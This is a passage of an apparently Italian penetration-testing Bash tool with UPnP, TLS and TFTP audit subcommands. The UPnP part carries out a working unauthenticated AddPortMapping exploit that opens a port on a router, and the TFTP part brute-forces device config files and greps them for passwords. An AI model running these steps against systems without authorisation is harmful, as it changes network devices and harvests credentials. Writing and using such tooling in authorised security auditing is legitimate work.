# ============================================================
usage_upnp() {
    echo "Uso: exa-dune upnp <TARGET> [OPTIONS]"
    echo ""
    echo "  UPnP/SSDP enumeration, SOAP exploit e IGD detection"
    echo "  Wraps: nmap upnp NSE, curl (SSDP, XML, SOAP)"
    echo ""
    echo "Opzioni:"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_upnp() {
    local target=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;        shift ;;
            --help|-h) usage_upnp; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_upnp; exit 1 ;;
            *)         target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_upnp; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "upnp"
    log "Target: $target | Output: $OUTDIR"

    section "Nmap UPnP Scan (TCP 2869, UDP 1900)"
    run_cmd "nmap_upnp" \
        "nmap -p 2869,1900 --script upnp-info \
         -oN \"$OUTDIR\"/nmap_upnp.txt $target 2>&1"

    section "SSDP M-SEARCH Discovery"
    if [[ $DRY_RUN -eq 0 ]]; then
        printf 'M-SEARCH * HTTP/1.1\r\nHOST: %s:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n' "$target" \
            | nc -u -w 3 "$target" 1900 2>&1 | tee "$OUTDIR/ssdp_discovery.txt"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} SSDP M-SEARCH → $target:1900"
    fi

    section "Device Description XML + Service Enumeration"
    local upnp_port=""
    local control_url=""
    if [[ $DRY_RUN -eq 0 ]]; then
        for p in 2869 1900 5000 49152 49153 52869; do
            local resp
            resp=$(curl -s --max-time 5 \
                "http://${target}:${p}/upnp/description.xml" \
                2>/dev/null || curl -s --max-time 5 \
                "http://${target}:${p}/rootDesc.xml" 2>/dev/null || true)
            if echo "$resp" | grep -qi "deviceType\|UPnP\|manufacturer"; then
                echo "XML UPnP su porta $p:" | tee -a "$OUTDIR/upnp_description.txt"
                echo "$resp" >> "$OUTDIR/upnp_description.txt"
                upnp_port="$p"
                # Estrai services e controlURL
                grep -oP '(?<=<serviceType>)[^<]+' "$OUTDIR/upnp_description.txt" 2>/dev/null \
                    | while IFS= read -r svc; do found INFO "UPnP service: $svc"; done || true
                control_url=$(grep -oP '(?<=<controlURL>)[^<]+' "$OUTDIR/upnp_description.txt" 2>/dev/null | head -1 || true)
                # IGD detection
                if echo "$resp" | grep -qi "WANIPConnection\|InternetGatewayDevice\|WANPPPConnection"; then
                    found HIGH "UPnP — IGD (Internet Gateway Device) rilevato su porta $p"
                fi
                break
            fi
        done
        if [[ -z "$upnp_port" ]]; then
            log "UPnP: nessuna description XML trovata"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Fetch UPnP XML da $target su porte 2869,1900,5000,49152..."
        upnp_port="2869"
    fi

    section "SOAP Action Enumeration (GetExternalIP, GetStatusInfo, GetNATRSIPStatus)"
    local soap_port="${upnp_port:-2869}"
    local soap_ctrl="${control_url:-/upnp/control/WANIPConn1}"
    local soap_urn="urn:schemas-upnp-org:service:WANIPConnection:1"

    for soap_action in GetExternalIPAddress GetStatusInfo GetNATRSIPStatus RequestConnection; do
        run_cmd "soap_${soap_action}" \
            "curl -s --max-time 5 -X POST 'http://${target}:${soap_port}${soap_ctrl}' \
             -H 'Content-Type: text/xml; charset=\"utf-8\"' \
             -H 'SOAPAction: \"${soap_urn}#${soap_action}\"' \
             -d '<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:${soap_action} xmlns:u=\"${soap_urn}\"/></s:Body></s:Envelope>' \
             2>&1 | tee \"$OUTDIR\"/soap_${soap_action}.txt"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/soap_${soap_action}.txt" ]]; then
            if grep -q "200\|NewExternalIPAddress\|NewConnectionStatus\|NATEnabled" \
               "$OUTDIR/soap_${soap_action}.txt" 2>/dev/null; then
                found MEDIUM "UPnP SOAP — $soap_action risponde (no auth)"
            fi
        fi
    done

    section "WANIPConnection AddPortMapping (unauthenticated exploit)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local add_resp
        add_resp=$(curl -s --max-time 8 -X POST \
            "http://${target}:${soap_port}${soap_ctrl}" \
            -H 'Content-Type: text/xml; charset="utf-8"' \
            -H "SOAPAction: \"${soap_urn}#AddPortMapping\"" \
            -d "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"${soap_urn}\"><NewRemoteHost></NewRemoteHost><NewExternalPort>14444</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>14444</NewInternalPort><NewInternalClient>127.0.0.1</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>exa-dune-probe</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>" \
            2>&1 || true)
        echo "$add_resp" > "$OUTDIR/upnp_addportmapping.txt"
        if echo "$add_resp" | grep -qE "HTTP/1\.[01] 200|AddPortMappingResponse"; then
            found HIGH "UPnP WANIPConnection — AddPortMapping SENZA AUTENTICAZIONE riuscito (porta 14444 mappata)"
            # Cleanup: DeletePortMapping
            curl -s --max-time 5 -X POST \
                "http://${target}:${soap_port}${soap_ctrl}" \
                -H 'Content-Type: text/xml; charset="utf-8"' \
                -H "SOAPAction: \"${soap_urn}#DeletePortMapping\"" \
                -d "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:DeletePortMapping xmlns:u=\"${soap_urn}\"><NewRemoteHost></NewRemoteHost><NewExternalPort>14444</NewExternalPort><NewProtocol>TCP</NewProtocol></u:DeletePortMapping></s:Body></s:Envelope>" \
                >/dev/null 2>&1 || true
            log "UPnP cleanup: DeletePortMapping inviato"
        else
            log "UPnP AddPortMapping: nessuna risposta positiva"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} UPnP WANIPConnection AddPortMapping exploit $target:${soap_port}"
    fi

    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/upnp_description.txt" ]]; then
        grep -oP '(?<=<manufacturer>)[^<]+|(?<=<modelName>)[^<]+|(?<=<firmwareVersion>)[^<]+' \
            "$OUTDIR/upnp_description.txt" 2>/dev/null \
            | tee "$OUTDIR/upnp_device_info.txt" || true
    fi

    local upnp_script="$EXA_SCRIPTS_DIR/python/upnp_exploit.py"
    if [[ -f "$upnp_script" ]]; then
        section "UPnP Exploitation (upnp_exploit.py)"
        run_cmd "upnp_exploit_py" "python3 \"$upnp_script\" $target --action addport 2>&1 | tee \"$OUTDIR\"/upnp_exploit.txt"
    fi

    ok "UPnP audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: ssl
# ============================================================
usage_ssl() {
    echo "Uso: exa-dune ssl <TARGET> [OPTIONS]"
    echo ""
    echo "  TLS/SSL full audit — cipher, protocolli, certificato, vulnerabilità"
    echo "  Wraps: testssl.sh, sslscan, openssl, nmap ssl NSE"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta (default: 443)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_ssl() {
    local target="" port=443
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;        shift ;;
            --help|-h) usage_ssl; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_ssl; exit 1 ;;
            *)         target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_ssl; exit 1; }
    validate_target "$target"
    validate_port "$port"
    setup_outdir "$target" "ssl"
    log "Target: $target:$port | Output: $OUTDIR"

    section "Certificato X.509"
    run_cmd "cert_openssl" \
        "echo | openssl s_client -connect '${target}:${port}' -servername '$target' 2>/dev/null \
         | openssl x509 -text -noout 2>/dev/null | tee \"$OUTDIR\"/cert_full.txt"
    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/cert_full.txt" ]]; then
        # Evidenzia date e CN/SAN
        grep -E "Subject:|Issuer:|Not Before|Not After|DNS:|IP Address:" "$OUTDIR/cert_full.txt" \
            | tee "$OUTDIR/cert_summary.txt" || true
        # Verifica scadenza
        local expiry; expiry=$(grep "Not After" "$OUTDIR/cert_full.txt" | head -1 | sed 's/.*Not After : //')
        if [[ -n "$expiry" ]]; then
            local exp_epoch; exp_epoch=$(date -d "$expiry" +%s 2>/dev/null || true)
            local now_epoch; now_epoch=$(date +%s)
            if [[ -n "$exp_epoch" && $exp_epoch -lt $now_epoch ]]; then
                found HIGH "SSL:$port — certificato SCADUTO il $expiry"
            elif [[ -n "$exp_epoch" && $((exp_epoch - now_epoch)) -lt 2592000 ]]; then
                found MEDIUM "SSL:$port — certificato scade tra meno di 30 giorni ($expiry)"
            fi
        fi
        # Self-signed check
        if grep -q "Issuer:.*Subject:" "$OUTDIR/cert_full.txt" 2>/dev/null; then
            local subj; subj=$(grep "Subject:" "$OUTDIR/cert_full.txt" | head -1)
            local issu; issu=$(grep "Issuer:"  "$OUTDIR/cert_full.txt" | head -1)
            [[ "$subj" == "$issu" ]] && found MEDIUM "SSL:$port — certificato self-signed"
        fi
    fi

    section "Cipher Suites + Protocolli (nmap)"
    run_cmd "ssl_enum" \
        "nmap -p $port \
         --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params,ssl-known-key \
         -oN \"$OUTDIR\"/ssl_nmap.txt $target 2>&1"
    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/ssl_nmap.txt" ]]; then
        # Esclude:
        #  - righe commento nmap (# Nmap ...) che contengono nomi di script (es "ssl-heartbleed")
        #  - righe "... disabled" — SSLv2/SSLv3/TLSv1 disabilitati = configurazione SICURA
        #  - righe "| MD5:" — fingerprint certificato, non cipher MD5
        grep -iE "SSLv2|SSLv3|TLSv1\.0 |VULNERABLE|heartbleed|POODLE|NULL cipher|EXPORT|RC4|MD5 cipher|DES cipher" \
            "$OUTDIR/ssl_nmap.txt" 2>/dev/null \
            | grep -v "^#" \
            | grep -iv "disabled\|not vulnerable\|^| MD5:" \
            | while IFS= read -r line; do
            found HIGH "SSL:$port — $line"
        done || true
        grep -i "least strength: [^A]" "$OUTDIR/ssl_nmap.txt" 2>/dev/null && \
            found MEDIUM "SSL:$port — cipher deboli rilevati (vedi ssl_nmap.txt)" || true
    fi

    section "testssl.sh"
    if require_tool testssl.sh; then
        run_cmd "testssl" \
            "testssl.sh --color 0 --logfile \"$OUTDIR\"/testssl.log \
             --csvfile \"$OUTDIR\"/testssl.csv ${target}:${port} 2>&1 | tee \"$OUTDIR\"/testssl_stdout.txt"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/testssl.csv" ]]; then
            grep -iE "CRITICAL|HIGH|MEDIUM" "$OUTDIR/testssl.csv" 2>/dev/null | \
                while IFS=, read -r _ _ _ sev finding _; do
                    found "${sev:-MEDIUM}" "testssl — $finding"
                done || true
        fi
    elif require_tool sslscan; then
        run_cmd "sslscan" \
            "sslscan --no-colour ${target}:${port} 2>&1 | tee \"$OUTDIR\"/sslscan.txt"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/sslscan.txt" ]]; then
            grep -iE "SSLv2|SSLv3|TLSv1\.0|NULL|EXPORT|RC4|anonymous|Vulnerable" \
                "$OUTDIR/sslscan.txt" 2>/dev/null | \
                while IFS= read -r line; do found HIGH "SSL:$port — $line"; done || true
        fi
    else
        warn "testssl.sh e sslscan non trovati — usa nmap results"
    fi

    section "STARTTLS (porte comuni)"
    for stls_port in 25 587 110 143 21; do
        check_port "$target" "$stls_port" || continue
        run_cmd "starttls_${stls_port}" \
            "echo | openssl s_client -connect '${target}:${stls_port}' -starttls smtp \
             2>/dev/null | openssl x509 -noout -subject 2>/dev/null \
             | tee -a \"$OUTDIR\"/starttls.txt" || true
    done

    ok "SSL audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: tftp
# ============================================================
usage_tftp() {
    echo "Uso: exa-dune tftp <TARGET> [OPTIONS]"
    echo ""
    echo "  TFTP enumeration — file di config VoIP/IoT, brute path"
    echo "  Wraps: nmap tftp-enum NSE, atftp"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta UDP (default: 69)"
    echo "  --filelist FILE    File con nomi da provare (default: built-in)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_tftp() {
    local target="" port=69 filelist=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --filelist) _req_arg "$1" "${2:-}"; filelist="$2";    shift 2 ;;
            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)  DRY_RUN=1;        shift ;;
            --help|-h)  usage_tftp; exit 0 ;;
            -*)         err "Opzione sconosciuta: $1"; usage_tftp; exit 1 ;;
            *)          target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_tftp; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "tftp"
    log "Target: $target:$port/udp | Output: $OUTDIR"

    section "Nmap TFTP Enum"
    run_cmd "nmap_tftp" \
        "nmap -sU -p $port --script tftp-enum \
         -oN \"$OUTDIR\"/nmap_tftp.txt $target 2>&1"

    section "TFTP File Probe"
    # Lista file comuni su device VoIP/IoT
    local _tftp_files
    if [[ -n "$filelist" && -f "$filelist" ]]; then
        _tftp_files="$filelist"
    else
        _tftp_files=$(mktemp)
        cat > "$_tftp_files" <<'EOF'
config.cfg
sip.cfg
phone.cfg
startup.cfg
running-config
system.cfg
voip.cfg
device.cfg
settings.cfg
account.cfg
network.cfg
firmware.bin
firmware.img
boot.bin
backup.cfg
factory.cfg
default.cfg
EOF
    fi

    if require_tool atftp; then
        if [[ $DRY_RUN -eq 0 ]]; then
            while IFS= read -r fname; do
                [[ -z "$fname" ]] && continue
                local outf="$OUTDIR/tftp_${fname//\//_}"
                if atftp --get --remote-file "$fname" --local-file "$outf" \
                         --option "timeout 3" "$target" &>/dev/null; then
                    if [[ -s "$outf" ]]; then
                        found HIGH "TFTP:$port — file scaricato: $fname ($(wc -c < "$outf") bytes)"
                        # Cerca credenziali nel file
                        grep -iE "password|passwd|secret|pin|auth" "$outf" 2>/dev/null | head -5 \
                            | while IFS= read -r l; do found CRITICAL "TFTP:$port/$fname — $l"; done || true
                    else
                        rm -f "$outf"
                    fi
                fi
            done < "$_tftp_files"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} TFTP probe di $(wc -l < "$_tftp_files" 2>/dev/null || echo 0) file su $target:$port"
        fi
    else
        warn "atftp non trovato — usa nmap results (apt install atftp)"
    fi

    [[ -z "$filelist" ]] && rm -f "$_tftp_files"
    ok "TFTP audit completato → $OUTDIR"
}

